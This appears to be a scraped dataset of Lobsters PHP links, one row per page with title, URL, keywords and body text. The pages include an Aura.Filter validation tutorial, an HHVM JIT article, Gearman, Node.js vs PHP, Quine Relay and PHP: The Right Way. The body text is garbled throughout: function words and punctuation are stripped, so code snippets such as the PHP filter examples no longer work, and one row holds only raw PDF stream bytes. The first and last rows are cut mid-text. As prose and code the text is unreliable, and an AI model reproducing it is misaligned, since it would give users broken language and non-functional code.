spectrum stop rule rule exactly sound like stop execution filter failure filtering validation restrictive rule type right middle though third rule type hard rule rule throw issue like others stop flow filtersvalidation field example get one error message one alnum check hard filter second constant define kind rule check applies validation example used rulecollection check essentially equal kind match validation two others compliment rulecollection isnot rulecollection isblankor sanitization two type rulecollection fix rulecollection fixblankor convert blank value null check doc see definition blank empty value first step filtering speaking filtering let give similar example one filter content instead validating php requireonce vendorautoloadphp filter requireonce vendoraurafilterscriptsinstancephp filter addsoftrule testing filter fix alnum object object array testing test filter value object echo new value object testing become used rulecollection fix type correct string contain alphanumeric character input string fun special character space filtering process strip leaving letter numeric string filtering run update property directly object reference truefalse return value method remains lot different type rule use filtering validation including numeric creditcard equaltofieldequaltovalue inkeysinvalues regex url word regex also special kind type use need complex validation one provided package using closure example php requireonce vendorautoloadphp filter requireonce vendoraurafilterscriptsinstancephp hardcoding return false make rule fail filter addsoftrule testing filter closure function echo data getvalue messagemap failureis error doh return false object object array testing test filter value object true echo message printr filter getmessages true else echo valid much like first example set soft rule rulecollection check essentially truefalse closure type last parameter closure closure bound instance rule class data nt passed execution instead need use getvalue method grab value property case return value hardcoded false make check fail return message error call inside closure messagemap set customized error message rule way set message bit meaning actual problem complex check usually mean one possible kind error filtering versus validating validating data coming relatively easy task nt match want kick back filtering bit tricky prospect filtering data basically akin guessing really never good idea come security application assurance want combine functionality something like aurafilter offer filter validate example say asked user give u phone number minus dash nonnumeric character assuming typical u number area code simplicity order sure nt given extra data want filter first validate php requireonce vendorautoloadphp filter requireonce vendoraurafilterscriptsinstancephp filter addsoftrule phone filter fix int filter addhardrule phone filter strlen user object array phone post phone filter value user true echo message printr filter getmessages true else echo valid user combine two method rulecollection fix rulecllection string length ensure given ten digit number extra character obviously given bogus data enough validation would fail get error message back real power combined tool like aurafilter really start shine use two different library one validate maybe something manual filter one stop kind solution word warning one thing remember filtering validation library disposal definite must phpbased application nothing builtin handle come caveat though remember never let package like lull false sense safety software written human regardless many unit test suite always assumption made edge case nt caught validation always better le check always made input good general rule thumb think trust resource data feeding example data coming highly secured database available outside world chance compromised information lower data awarded bit higher level trust data coming something like external api even user never left unfiltered unvalidated malicious kind data source provide really bad data since control best thing handle tainted resource chris cornutt year experience development focus application security chris quest bring knowledge mass making application security accessible everyone also avodcate security php community provides application security training consulting service
272,Lobsters,php,PHP programming,Faster and Cheaper: The Evolution of the hhvm JIT,http://www.hhvm.com/blog/2027/faster-and-cheaper-the-evolution-of-the-hhvm-jit,faster cheaper evolution hhvm jit,jit facebookcom hphpc post almost ssa form hhir bytecodespecification commit parent irspecification arm comment,hhvm project started almost year ago twopart mandate first create php jit could serve facebookcom least efficiently hphpc php execution engine using time second replace hphpi interpreter php developer using daily work hphpc hphpi independent piece software unintentional subtle difference behavior significant maintenance burden unifying execution engine used production development would make job easier giving php devs nicer experience time find balance reaching goal quickly possible designing system could extended improved many year replaced hphpc hphpi also concern time compilation might fast enough keep facebook aggressive deployment process pushing new version site fleet web server every weekday whole process took le minute maintain ability hhvm viable option taking account initial jit design simplest fastest one thought good chance succeeding familiar general architecture hhvm might want read post continuing jit functionality ended c class named often use translation refer process converting sequence bytecode instruction tracelet equivalent sequence instruction translation selected tracelet translate walk emits machine code bytecode selfcontained unit knew would miss many crossbytecode optimization opportunity approach would much simpler implement importantly microbenchmark result suggesting would good enough beat hphpc end approach almost enough get job done summer drawing close hhvm still competitive hphpc solid plan change project year old knew beat hphpc soon seriously reconsider hhvm future fact hphpc gotten twice fast since hhvm birth help either though great news web server went lockdown throw everything hhvm push across finish line month working hard comfortably beat goal pushing hhvm faster hphpc one big optimization got u kept chipping away making lot small improvement like reducing cache miss reducing code size taking advantage statically inferred type information many tweak success hhvm inevitable point make far needed hack crossbytecode optimization thought could avoid first iteration jit since designed support optimization code became increasingly complicated hard work clear got u past first finish line probably going enough future improvement mind chart progress percentage hphpc efficiency mid february hphpc completely retired since software engineer solved problem adding new layer indirection new layer ssa form intermediate representation positioned bytecodes tracelets machine code want end strongly typed designed facilitate number optimization wanted port well new optimization future new ir named hhir short hiphop intermediate representation completely replaced hhvm jit may hhir specifically refers representation often use name refer piece code interact looked source code recently might noticed class named still exists contains nontrivial amount code mostly artifact system designed something plan eventually clean code left machinery required emit code link translation together code understood translate individual bytecodes gone hhir replaced generating code roughly faster looked significantly better upon manual inspection followed production debut another minilockdown got additional performance gain top see improvement action let look function addpositive part translation function addpositive arr n count arr sum n elem arr elem sum sum elem return sum function look like lot php code loop array something element let focus line along bytecode elem arr elem line cgetm setl popc line int gt jmpz two line load element array store local variable compare value local conditionally jump somewhere based result interested detail going bytecode skim bytecodespecification jit back day break code two tracelets one cgetm another rest instruction full explanation happens relevant mostly know compile time type array element translation cgetm boil call c helper function interesting looking second tracelet commit official retirement let use parent see translated code cmpl rbx jnz cmpl rbp jnle setl popc movq rbx rax movq rbp int xor ecx ecx mov rax rdx movl rbp movq rax rbp add rbx cmp rcx rdx gt jmpz jle first four line typechecks verifying value elem value top stack type expect either fails jump code trigger retranslation tracelet using new type generate differently specialized chunk machine code meat translation follows code plenty room improvement dead load line easily avoidable register register move line opportunity constant propagation line consequence bytecodeatatime approach used respectable compiler would ever emit code like simple optimization required avoid fit model let see tracelet translated using hhir hhvm revision cmpl rbx jnz cmpl rbp jnle setl movq rbx rcx movl rbp movq rcx rbp gt jmpz add rbx cmp rcx jle begin typechecks body translation instruction significantly better notice dead load register register move immediate int bytecode propagated cmp line hhir generated tracelet translation deflabel frameptr deffp stkptr defsp frameptr stkptr guardstk stkptr guardloc frameptr int ldstack stkptr stloc frameptr int stkptr spillstack stkptr syncabiregs frameptr stkptr reqbindjmplte int bytecode instruction broken smaller simpler operation many operation hidden behavior certain bytecodes explicitly represented hhir ldstack line part setl using unnamed temporary instead physical register represent flow value easily track definition use value make trivial see destination load actually used one input instruction really constant value bytecodes ago much thorough explanation hhir work take look irspecification example showed improvement hhir made getting hhir deployed production retiring may great milestone hit beginning since implemented many optimization would nearly impossible making hhvm almost twice efficient process also crucial effort get hhvm running arm processor isolating reducing amount architecturespecific code need reimplement watch upcoming post devoted arm port detail comment dawehner december would great graph extended facebook planning move arm based server joseph scott latest update facebook hhvm jit ended interesting note emphasis brett simmer one devs working post recent perf improvement newer graph facebook hint arm server deployment tech news analysis rumor google building armbased server post blog dedicated facebook hiphop virtual machine php code note translation engine play crucial effort get hhvm running arm facebook hint arm server deployment website rumor google building armbased server post blog dedicated facebook hiphop virtual machine php code note translation engine play crucial effort get hhvm running arm facebook hint arm server deployment rumor google armbased server post blog facebook hiphop machine php code note engine play effort get hhvm facebook hint arm server deployment news rumor google building armbased server post blog dedicated facebook hiphop virtual machine php code note translation engine play crucial effort get hhvm running arm facebook hint arm server deployment content loop rumor google building armbased server post blog dedicated facebook hiphop virtual machine php code note translation engine play crucial effort get hhvm running arm facebook hint arm server deployment earthgrid rumor google building armbased server post blog dedicated facebook hiphop virtual machine php code note translation engine play crucial effort get hhvm running arm facebook porting php engine arm high performance computing info hhvm blog post article programowanie w php blog archive hiphop blog faster cheaper evolution hhvm jit hhvm hiphop virtal machine blog new post look evolution hhvm jit compiler since project started four year facebook hiphop vm c arm hhvm facebook php engine eyeing move arm server chip crutch technology post hip hop virtual machine hhvm blog thursday indicated team implementing arm processor support facebook php engine eyeing move arm server chip techworthyinfo post hip hop virtual machine hhvm blog thursday indicated team implementing arm processor support facebook php engine eyeing move arm server chip plugged matrix post hip hop virtual machine hhvm blog thursday indicated team implementing arm processor support nowe technologie google stworzy własne mikroprocesory na rdzeniach arm właśnie swoje plany dotyczące wykorzystania procesorów z rdzeniami arm ogłosił facebook informując że bliski jest przeniesienia kompilatorów php na nową architekturę następnie publikując facebook php engine eyeing move arm server chip techy news today post hip hop virtual machine hhvm blog thursday indicated team implementing arm processor support facebook hint arm server deployment vigalum rumor google building armbased server post blog dedicated facebook hiphop virtual machine php code note translation engine play crucial effort get hhvm running arm eltechs facebook considers shift armbased server recent post hip hop virtual machine hhvm blog indicates team work implementing arm support hhvm facebook php engine hhvm hack part sitepoint hphpc good job improving performance without issue maintaining hphpc hphpi sync proved cumbersome plus difference still existed transpiled code v interpreted one back facebook decided go another approach created hhvm new virtual machine designed replace zend engine used php end hhvm achieved performance parity former hphpc soon surpassed hhvm hack part bruno škvorc warwebdev hphpc good job improving performance without issue maintaining hphpc hphpi sync proved cumbersome plus difference still existed transpiled code v interpreted one back facebook decided go another approach created hhvm new virtual machine designed replace zend engine used php end hhvm achieved performance parity former hphpc soon surpassed hhvm next six month hiphop virtual machine set aggressive efficiency goal half hope achieve range jit compiler project hope translate win variety php workload shooting advanced micro device inc amd news best catalyst amd seeking alpha home audio market promise energyefficient armbased server processor prompted facebook engineer make hiphop virtual machine jit compilation engine run facebook server farm limbajul de programare hack apocalipsa php claudiu persoiu ruleaza pe hhvm hhvm este incercarea facebook de optimizare limbajului php prin time complication ultima abordare de optimizare limbajului practic facebook incearca sasi reduca din costuri ein halbes jahr hhvm entwicklerde set aggressive efficiency goal half hope achieve range jit compiler project hope translate win variety php workload shooting hhvm wordpress rokkich beautiful like administration simplicity throughput benefit offer jit performing better better new release absolutely brilliant
273,Lobsters,php,PHP programming,gearman [Gearman Job Server],http://gearman.org/,gearman gearman job server,gearman open source multilanguage flexible fast embeddable single point failure limit message size worried scaling communication gearman work documentation gearman useful involved project example,gearman gearman provides generic application framework farm work machine process better suited work allows work parallel load balance processing call function language used variety application highavailability web site transport database replication event word nervous system distributed processing communicates strong point gearman open source free meaning word gearman active open source community easy get involved need help want contribute worried licensing gearman bsd multilanguage interface number language list growing also option write heterogeneous application client submitting work one language worker performing work another flexible tied specific design pattern quickly put together distributed application using model choose one option mapreduce fast gearman simple protocol interface optimized threaded server written cc minimize application overhead embeddable since gearman fast lightweight great application size also easy introduce existing application minimal overhead single point failure gearman help scale system fault tolerant way limit message size gearman support single message size need something bigger problem gearman chunk message worried scaling worry gearman craig list tumblr yelp etsy discover others known year content updated regularly please check back often may also want check form communication would like learn get involved gearman work gearman powered application consists three part client worker job server client responsible creating job run sending job server job server find suitable worker run job forward job worker performs work requested client sends response client job server gearman provides client worker apis application call talk gearman job server also known gearmand need deal networking mapping job internally gearman client worker apis communicate job server using tcp socket explain gearman work detail let look simple application reverse order character string example given php although apis look quite similar start writing client application responsible sending job waiting result print using gearman client api send data associated function name case function reverse code error handling omitted brevity php reverse client code client new gearmanclient client addserver print client reverse hello world code initializes client class configures use job server addserver argument mean use default port tell client api run reverse function workload hello world function name argument completely arbitrary far gearman concerned could send data structure appropriate application text binary point gearman client api package job gearman protocol packet send job server find appropriate worker run reverse function let look worker code php reverse worker code worker new gearmanworker worker addserver worker addfunction reverse function job return strrev job workload worker work code defines function myreversefunction take string return reverse string used worker object register function named reverse setup connect local job server client job server receives job run look list worker registered function name reverse forward job one free worker gearman worker api take request run function myreversefunction sends result function back job server client see client worker apis along job server deal job management network communication focus application part different way run job gearman including background asynchronous processing prioritized job see documentation available various apis detail gearman useful reverse example seems like lot work run function number way useful simplest answer use gearman interface client worker written different language want php web application call function written c could use php client api c worker api stick job server middle course efficient way like writing php extension c may want php client python worker perhaps mysql client perl worker mix match supported language interface easily need application able understand workload sent favorite language supported yet get involved project probably fairly easy either one existing gearman developer put language wrapper top c library next way gearman useful put worker code separate machine cluster machine better suited work say php web application want image conversion much processing run web server machine could instead ship image separate set worker machine conversion way load impact performance web server php script also get natural form load balancing since job server sends new job idle worker worker running given machine busy need worry new job sent make scaleout multicore server quite simple core worker machine start instance worker perhaps cpu bound also seamless add new machine expand worker pool boot install worker code connect existing job server probably asking job server dy able run multiple job server client worker connect first available job server configured way one job server dy client worker automatically fail another job server probably want run many job server two three good idea redundancy diagram left show simple gearman cluster may look scale client worker needed job server easily handle hundred client worker connected draw physical virtual machine line capacity allows potentially distributing load number machine detail specific us installation see section example update come
274,Lobsters,php,PHP programming,PHP.net Compromise | Barracuda Labs analysis,http://barracudalabs.com/2013/10/php-net-compromise/,phpnet compromise barracuda lab analysis,,neverending battle cybersecurity cybercrime cybercriminals continue find new technique continue reading
275,Lobsters,php,PHP programming,Taking PHP Seriously,https://raw.github.com/strangeloop/StrangeLoop2013/master/slides/sessions/Adams-TakingPHPSeriously.pdf,taking php seriously,,obj length r filter flatedecode stream xo eu endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text imageb imagec imagei colorspace r r font r xobject r endobj obj length r type xobject subtype image width height interpolate true colorspace r intent perceptual bitspercomponent filter flatedecode stream c e ď g jk qc q f b ep k
276,Lobsters,php,PHP programming,Node.js vs. PHP,http://flippinawesome.org/2013/09/03/node-js-vs-php/,nodejs v php,azat mardanov composer inconsistent api subpar performance nodejs npm disclaimer openlistco rapid prototyping j hackreactor syntax semicolon optional iife object php pseudoclassical classical pdo mongoskin context switch human task switch considered harmful php nodejs email protected email protected module php pear composer call nodejs npmjsorg ecosystem php nodejs number contribution framework php cakephp zend extensive list nodejs expressjs meteor derby realtime apps php elephantio approach apache websocket ratchet nodejs socketio expressjs handlebar meteor derby database apps php nodejs simple test mongodb v mysql thirdparty service apps php nodejs web server php builtin development server nodejs hosting php platform service nodejs heroku nodjitsu performance program fastest php engine hiphop vm nodejs conclusion javascript good part eloquent javascript http webapplogcomphpvsnodejs react quickly full stack javascript practical nodejs pro expressjs webapplogcom http azatco http wwwlinkedincominazatm http webapplogcom http webapplogcombooks,azat mardanov php going disappear soon position undermined even nascent nodejs internet exploded php thing cool kid php caught interpreted language unlike c java require source code compilation ability used directly within html template file cheap shared hosting provider apache server linux apache mysql php lamp stack functional nature easier learn objectoriented programming year php apps became vulnerable security threat eg sql injection lacked centralized packaging registry composer inspired node package manager inconsistent api suffered subpar performance easy argue better alternative php example ruby rail django however nothing approachable nodejs familiar nodejs heard quite grasp concept like say functionally similar php apache asp ii stack nowadays also gaining momentum platform us javascript nonblocking io mechanism allows excellent performance nodejs also come robust package manager solution npm stand node package manager however nodejs lowerlevel technology comparable complex framework like strut rail django directly many people whether software engineer entrepreneur often faced decision tech stack use article try compare php nodejs using applestoapples approach looking question different angle including syntax context switch module ecosystem framework realtime apps database apps thirdparty service apps web server hosting performance disclaimer article reflects opinion wanted start clarifying background might reflected within point view worked many technology including ruby rail python vb asp perl course php one complex php project openlistco involved use mvc pattern template engine class database abstraction layer htaccess rerouting however past couple year focus dedicated solely nodejs frontend javascript framework like backbonejs opinion might biased please feel free comment based upon experience real project php nodejs want learn nodejs take look book rapid prototyping j coding intensive fulltime course hackreactor syntax section look simple code example compare syntax php javascript mentioned nodejs based upon platform accessed command line interface via php node example snippet print hello world php echo hello world output nodejs consolelog hello world note javascript semicolon optional except inside loop immediatelyinvoked function expression iife following sleep function php echo n sleep echo b n echo c n code output second delay b c try rewrite code nodejs consolelog settimeout function consolelog b consolelog c snippet print c second delay print b difference output settimeout function asynchronous meaning remaining code stop executing function processed note javascript consolelog automatically add end line symbol loop php might look like echo strikingly similar nodejs var consolelog create array php user array array name john id array name peter id create array nodejs var user name john id name peter id iterate array php count user user id mtrand iterate array nodejs var arrlength user mathfloor mathrandom functional manner usersforeach function user user mathfloor mathrandom declare function php function hello name echo hi name hello peter output hi peter declare function nodejs function hello name consolelog hi name hello peter output hi peter declare new object php class foo function dofoo echo foo bar new foo bar dofoo declare new object nodejs var foo function return dofoo function consolelog foo var bar foo bardofoo note class nodejsjavascript object inherit directly object prototypal inheritance many instantiating pattern pseudoclassical functional classical database snippet pdo database connection library php pdo new pdo sqlite usersdb stmt pdo prepare select name user id id stmt bindparam id get id pdo paramint execute nodejs database script mongoskin mongodb library assuming use connectexpress middleware reqquery var db require mongoskin db dbcollection user find id reqqueryid toarray function err result err throw err consolelog result context switch switch different environment language attributed drop efficiency writing software code research personal anecdotal observation show interruption negatively impact programmer performance le language learn remember flow smoother code better deeper article subject might want take look human task switch considered harmful multitasking myth php lamp stack ie linux apache mysql php developer must master least two language php sql addition mandatory omnipresent html cs javascript nodejs nodejs brilliant le context switch together mongodb stack operate one language javascript example mongodb shell command called mongo dbusersfind dbusersinsert name azat email email protected dbusersupdate name azat set email email protected module php pear veteran system installs package server globally better alternative composer case developer seek module component call various website administer manually placing php file subfolders project unfortunately kosher nodejs nodejs come superior dependable package management system called npm registry npmjsorg easy use publish everything administered via packagejson file versioned locally unless installing cli tool g option ecosystem php probably one important area php still beat nodejs amazing opensource application like wordpress ton free script quality tool book nodejs nodejs growing faster platformlanguage mostly due philosophy keeping module minimal performing small set task factor might include thing popularity frontend javascript among web developer existence spec abundance javascript resource guru amassed language many year existence collaborative opensource community mostly github ease npm use publish npm module run npm publish result people predict nodejs surpass language absolute number contribution framework important rich tool proven library disposal php cakephp zend come mind first choice extensive list nodejs playing field relatively level expressjs popular choice fullstack mvc framework like meteor derby growing quickly realtime apps php php nodejsdependent elephantio approach problem native php websockets apache ii php usually run module really built persistent connection mind therefore developer use standalone process like apache websocket ratchet nodejs building realtime apps breeze nodejs stack using socketio library expressjs framework handlebar reactive template engine meteor derby project building realtime apps taken one step combining front back end code base persistence layer reduces complexity speed development dramatically database apps php php long fruitful history traditional relational database like mysql hence name stack lamp linux apache mysql php nodejs nodejs natural nosql database like mongodb database performance somewhat comparable mysql depending use case reference see mysql v mongodb performance benchmark mysql simple test mongodb v mysql mongodb mongodb v mysql fight mongodb article however mongodb superior distributed database highly scalable added bonus without fixed schema nosql database perfect cloud computing prototyping agile project thirdparty service apps php case many traditional language php flow blocked remote server responded hence need multithreading note language provide feature special librariesframeworks eventmachine ruby twisted python used however complex built ground platform nodejs contrary due nonblocking io nodejs handle multiple request make multiple request client thirdparty service eg twitter amazon one thread execution web server php since php higher builtin development server started php assuming indexphp folder php echo hello world version prior allinone tool like mamp xampp production environment php run one popular technology used php apache nginx php module apache web server personal experience apache steep learning curve configurable default configuration prone security leak nodejs nodejs created ground network application set core module write web server start nodejs server node indexjs file folder code create new server var http require http httpcreateserver function req re reswritehead contenttype textplain resend hello worldn listen consolelog server running http production nodejs run smartos linux like ubuntu service note multithreading absolutely possible nodejs cluster andor external module hosting php php owes popularity large part ease cheapness shared hosting solution true hard find one without lamp stack commoditization sometimes lead security hole le acceptable downtime due hosting provider overselling consumer using malicious code platform service better alternative somewhere fullfledged dedicated server shared hosting paas provider support php right gate nodejs nodejs work nicely paas heroku nodjitsu leading list also cloud infrastructure company joyent maintainer nodejs developed powerful operation system smartos allows performance burst painless deployment dtrace debugging performance needle say performance important resource show different benchmark test program fastest php php relatively fast due bottleneck file system database thirdparty request fails miserably comparison nodejs super fast engine example facebook reached scalability limit php wrote extremely fast c library virtual machine called hiphop vm kept php api nodejs nodejs extremely fast due nonblocking io mechanism engine technology even heard joyent started rewriting c module nodejs conclusion php outstanding technology day success popularity came ease learning use availability cheap straightforward hosting mostly using shared lamp server abundance opensource script apps library time opinion thing lead dusk contribution core beginner programmer modified api inconsistently lack oopclasses module management system inhibited opensource community growth absence leading framework ruby rail come mind example single dominant framework language programming paradigm also helped produce lot bad code relied heavily mixing php html code without separation concern hand lot good product infrastructure built php stay time nodejs relatively young three year since first commit already fastest growing platform pace contribution absolute number surpass language year fact javascript language popular language world biggest attributed many tool ported nodejs little modification browser environment also great book javascript fundamental example javascript good part eloquent javascript experienced surge popularity importantly perhaps nodejs efficient great building realtime nosqloriented scalable system article originally published http webapplogcomphpvsnodejs azat mardan technology fellow manager capital one javascriptnodejs expert several online course udemy node university author book published topic including react quickly manning full stack javascript apress practical nodejs apress pro expressjs apress spare time azat writes tech webapplogcom speaks conference contributes opensource becoming expert nodejs azat finished master degree information system technology worked u federal government agency small startup big corporation various technology java sql php ruby azat passionate technology finance new disruptive way educating empowering people website http azatco linkedin http wwwlinkedincominazatm professional blog http webapplogcom publication book http webapplogcombooks
278,Lobsters,php,PHP programming,Quine Relay,https://github.com/mame/quine-relay,quine relay,quine relay usage ubuntu install interpreterscompilers run program interpretercompiler docker platform instruction platform wiki tested interpretercompiler version frequently asked question q take pick q world obfuscated esoteric artistic programming amazoncojp alphabetonly ruby program radiationhardened quine q language xxx missing criterion language inclusion q really work q long take try cross world line q code fit display go q code generated license,quine relay ruby program generates rust program generates scala program generates language total rexx program generates original ruby code want see old version see branch usage ubuntu using ubuntu lts focal fossa perform following step install interpreterscompilers first type following aptget command install sudo aptget install afnix aplusfsf aspectc aspectj asymptote bash bc bf bsdgames bsh clisp clojure cmake coffeescript dafny dc eceredev elixir emacsnox erlang fish flex fpcompiler fsharp g gap gawk gcc gdb gdc generatorscriptinglanguage genius gforth gfortran ghc ghostscript gnat gnusmalltalk gnucobol gnuplot gobjc golang groovy gzip haxe icont iconx intercal iverilog jasminsable jq julia ksh lisaac livescript llvm make maximum minizinc mlton monodevel monomcs monovbnc nasm neko nickle nim nodetypescript nodejs ocaml octave pakcs parigp perl phpcli rbase rakudo ratfor rc reginarexx ruby rubymustache rustc scala scilabcli sed slsh spin swiprolog tcl tcsh valac vim xsltproc yabasic yorick zoem zsh build bundled interpreter sudo aptget install cmake libpngdev libgddev groff bison curl make c vendor run program interpretercompiler ulimit unlimited ruby qrrb qrrs rustc qrrs qr qrscala scalac qrscala scala qr qrscm guile qrscm qrsci scilabcli nb f qrsci qrsed sed e f qrsed qrsed qrspl qrspl qrsplc gcc qr vendorlocalinclude l vendorlocallib qrsplc lspl lm qr qrsl slsh qrsl qrst gst qrst qrnut squirrel qrnut qrsml mlton mlton fixedheap qrsml qr qrsq ruby vendorsubleqrb qrsq qrtcl tclsh qrtcl qrtcsh tcsh qrtcsh qrt ruby vendorthuerb qrt qrts tsc outfile qrtsjs qrts nodejs qrtsjs qrunl ruby vendorunlambdarb qrunl qrvala valac qrvala qr qrmid mono vendorlocalbinvltexe qrmid mono qrexe qrv iverilog qr qrv qr vcdnone qrvim vim es qrvim qrvb vbnc qrvb mono qrexe qrws ruby vendorwhitespacerb qrws qrxslt xsltproc qrxslt qryab yabasic qryab qryorick yorick batch qryorick qrazm zoem qrazm qrzsh zsh qrzsh qr qr qradb gnatmake qradb qr qrals langc ldlibrarypathusrlibafnix axi qrals qraheui ruby vendoraheuirb qraheui qrante ruby vendoranterb qrante qrcc ag qr qrcc qr qraj ajc qraj java qr qrasy asy qrasy qrdats patscc qr qrdats qr qrawk awk f qrawk qrbash bash qrbash qrbc bc q qrbc qrbsh bsh qrbsh qrbef cfunge qrbef qrblc ruby vendorblcrb qrblc qrbf bf qrbf qrc gcc qr qrc qr qrcpp g qr qrcpp qr qrcs mc qrcs mono qrexe qrchef compilechef qrchef qrchefpl perl qrchefpl qrclj clojure qrclj qrcmake cmake p qrcmake qrcob cobc x qrcob qr qrcoffee coffee nodejs qrcoffee qrlisp clisp qrlisp qrcurry pakcs nocypm load qrcurry save quit qr qrd gdc qr qrd qr qrdfy dafny qrdfy mono qrexe qrdc dc qrdc qrec true ecp c qrec qrsym ecc c qrec qrc ec console qrsym qrimp qrmainec ecp c qrmainec qrmainsym ecc c qrmainec qrmainc gcc qr qrc qrmainc lecerecom qr qrexs elixir qrexs qrel emacs q script qrel qrerl escript qrerl qrfsx fsharpc qrfsx qrexe mono qrexe qrfalse ruby vendorfalserb qrfalse qrfl flex qrflc qrfl gcc qr qrflc qr qrfish fish qrfish qrfs gforth qrfs qrf gfortran qr qrf qr gfortran qr qr qrgbs qrgbs qrg gap q qrg qrgdb gdb q x qrgdb qrgel genius qrgel qrgsl gsl q qrgsl qrplt gnuplot qrplt qrgo go run qrgo qrgs ruby vendorgolfscriptrb qrgs qrgrass ruby vendorgrassrb qrgrass qrgroovy groovy qrgroovy qrgz gzip cd qrgz qrhs ghc qrhs qr qrhx haxe main qr neko qrn neko qrn qricn icont qricn qr qri ick bfoc qri gcc static qrc usrincludeick qr lick qr qrj jasmin qrj java qr qrjava javac qrjava java qr qrjs nodejs qrjs qrjq jq r n f qrjq qrjsfuck nodejs qrjsfuck qrjl julia qrjl qrksh ksh qrksh qrlazy lazyk qrlazy qrli lisaac qrli qr qrls lsc qrls qrll llvmas qrll lli qrbc qrlol lci qrlol qrlua qrlua qrmk make f qrmk qrmac maximum q initmacqrmac qrmzn minizinc solver gecode solnsep qrmzn qril ilasm qril mono qrexe qrmustache mustache qrmustache qrmustache qrasm nasm felf qrasm ld qr qro qr qrneko nekoc qrneko neko qrn nickle qrnim nim c qrnim qr qrm gcc qr qrm qr qrml ocaml qrml qroctave mv qrm qrmbak octave qf qroctave qrook mv qrmbak qrm ruby vendorooktobfrb qrook qrookbf bf qrookbf qrgp gp f q qrgp qrp qrp qrpas fpc qrpas qr qrpl perl qrpl qrphp php qrphp qrpng npiet qrpng qrpike pike qrpike qrps g dnodisplay q qrps qrppt ppt qrppt qrprolog swipl q qr f qrprolog qrpr spin qrpr qrpy qrpy qrr r slave f qrr qrratfor ratfor qrratforf qrratfor gfortran qr qrratforf qr qrrc rc qrrc qrrexx rexx qrrexx see qrrb diff qrrb alternatively type make make note may require huge memory compile file docker simply build image run container follows docker build qr docker run privileged rm e citrue qr note need run privileged mode otherwise maximum command fail want check generated file mount local directory docker container keep using vendor directory container follows docker run privileged rm e citrue v pwd usrlocalsharequinerelay v usrlocalsharequinerelayvendor qr platform may find instruction platform wiki using linux distribution please find way could please let know good luck tested interpretercompiler version used following ubuntu deb package test program language ubuntu package version ruby ruby rust rustc scala scala scheme scilab scilabcli sed sed shakespeare na slang slsh smalltalk gnusmalltalk squirrel standard ml mlton subleq na tcl tcl tcsh tcsh thue na typescript nodetypescript unlambda na vala valac velato na verilog iverilog vimscript vim visual basic monovbnc whitespace na xslt xsltproc yabasic yabasic yorick yorick zoem zoem zsh zsh aplusfsf ada gnat afnix afnix aheui na algol ante na aspectc aspectc aspectj aspectj asymptote asymptote at awk gawk bash bash bc bc beanshell bsh befunge na na brainfuck bf c gcc c g c monomcs chef na clojure clojure cmake cmake cobol gnucobol coffeescript coffeescript common lisp clisp curry pakcs gdc dafny dafny dc dc ec eceredev elixir elixir emacs lisp emacsnox erlang erlang f fsharp false na flex flex fish fish forth gforth gfortran gamba script gap gap gdb gdb gel genius genius generatorscriptinglanguage generatorscriptinglanguage gnuplot gnuplot go golang golfscript na grass na groovy groovy gzip gzip haskell ghc haxe haxe icon icont iconx intercal intercal jasmin jasminsable java javascript nodejs jq jq jsfuck nodejs julia julia ksh ksh lazy k na lisaac lisaac livescript livescript llvm asm llvm lolcode na lua makefile make maximum maximum minizinc minizinc msil monodevel mustache rubymustache nasm nasm neko neko nickle nickle nim nim objectivec gobjc ocaml ocaml octave octave ook na parigp parigp parser pascal fpcompiler perl perl perl rakudo php phpcli piet na pike postscript ghostscript ppt punched tape bsdgames prolog swiprolog promela spin spin python r rbase ratfor ratfor rc rc rexx reginarexx note language available ubuntu marked na repository includes implementation vendor see also vendorreadme detail frequently asked question q take pick q good news published book world obfuscated esoteric artistic programming explains write quine asciiart quine uroboros quine like quinerelay buy book amazoncojp also contains almost forty work including alphabetonly ruby program radiationhardened quine etc explains many technique write program bad news written japanese hope could translate english help earn royalty q language xxx missing see criterion language inclusion detail short please create deb package contribute ubuntu see also q really work q long take try cross world line q code fit display go q code generated sudo aptget install rake rubycairo optipng advancecomp rubychunkypng cd src clobber license mit license applies resource except file vendor directory file vendor directory thirdparties distributed different license see vendorreadme detail mit license mit copyright c yusuke endoh mametter hirekoke permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software
279,Lobsters,php,PHP programming,boris is a tiny REPL for PHP,https://github.com/d11wtq/boris,boris tiny repl php,boris announcement note usage wiki contributing contributing contributing contributing phpunit core team chris corbyn tejas manohar dennis hotson wonderful contributor copyright licensing license,boris tiny robust repl php announcement looking add one two additional collaborator commit access actively involved open source github profile review ping twitter express interest experienced developer active github project python one ruby one clojure one php one boris php missing repl readevalprint loop allowing developer experiment php code terminal interactive manner make mistake nt matter boris report error stand attention input everything enter boris evaluated result inspected understand happening state maintained input allowing gradually build solution problem note pcntl function required run boris available window platform process transitioning away php ruby come find php lack real repl frustrating able find existing implementation complete boris weighs hundred line fairly straightforward code usage check wonderful wiki usage instruction contributing committed looselycoupled architecture boris would love get contribution jumping check contributing contributing page wiki contributing using phpunit testing run test phpunit bootstrap testsautoloadphp c testsxml core team module originally developed chris corbyn maintained tejas manohar dennis hotson wonderful contributor copyright licensing see license file detail
280,Lobsters,php,PHP programming,PHP: The Right Way,http://www.phptherightway.com/,php right way,welcome translation book go leanpub contribute contribute github use current stable version php new feature already end life backwards compatibility break phpnet builtin web server mac setup install php via homebrew homebrew brewphpswitcher install php via macports macports install php via phpbrew phpbrew install php via liip binary installer phposxliipch compile source compile xcode command line tool xcode allinone installers apache nginx mamp xampp window setup windowsphpnetdownload path web platform installer xampp easyphp openserver wamp phpmanager dedicated area iisnet virtual machine php development using window common directory structure paul jones standard php package skeleton composer standard php package skeleton code style guide framework interop group phpcodesniffer sublime text php code beautifier fixer php coding standard fixer clean code php programming paradigm objectoriented programming functional programming namespaces standard php library command line interface command line option xdebug installing xdebug dependency management composer pear composer packagist packagist install composer following official instruction note installing window composersetup define install dependency twig updating dependency update notification librariesio checking dependency security issue security advisory checker handling global dependency composer pear pear install pear install instruction install package pear package list using channel doc handling pear dependency composer composer basic date time carbon design pattern http designpatternsphpreadthedocsio working alex cabal php best practice oneliner careful detailed consistent php level multibyte string extension database level browser level charset tag reading internationalization localization internationalization localization pluralization common way implement unix tool called auraintl oscaroterogettext symfonytranslation laravel yii icu project gettext installation poedit downloaded free website structure type file domain symfony locale code iso iso rare language directory structure plural form plural 